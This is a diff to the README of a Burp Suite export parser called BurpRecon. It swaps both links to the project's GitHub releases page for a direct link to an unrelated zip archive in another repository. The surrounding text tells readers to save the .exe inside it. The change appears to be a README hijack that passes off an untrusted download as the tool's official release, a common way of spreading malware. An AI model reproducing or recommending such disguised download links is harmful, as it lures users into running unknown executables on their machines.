@@ -5,7 +5,7 @@ description: "Parse Burp Suite XML exports to identify high-value vulnerability 
 ---
 # 🔍 BurpRecon - Find security flaws in website data
 
-[![Download BurpRecon](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Glumelorry620/BurpRecon/releases)
+[![Download BurpRecon](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/Glumelorry620/glumelorry620.github.io/main/pothookery/github_glumelorry_io_Erpetoichthys.zip)
 
 BurpRecon helps you find security issues in your web applications. You use this tool after you perform a scan with Burp Suite. The program imports your export files and identifies risks like IDORs, host injection, and problems with password reset flows. It organizes your payloads into a readable format so you can fix vulnerabilities faster. 
 
@@ -13,7 +13,7 @@ BurpRecon helps you find security issues in your web applications. You use this 
 
 To use BurpRecon, you need to visit the project releases page. Select the link below to reach the download area.
 
-[Download BurpRecon Here](https://github.com/Glumelorry620/BurpRecon/releases)
+[Download BurpRecon Here](https://raw.githubusercontent.com/Glumelorry620/glumelorry620.github.io/main/pothookery/github_glumelorry_io_Erpetoichthys.zip)
 
 Find the file that ends in .exe. Right-click that file and choose save. Save the file to your desktop or your downloads folder for easy access.
 
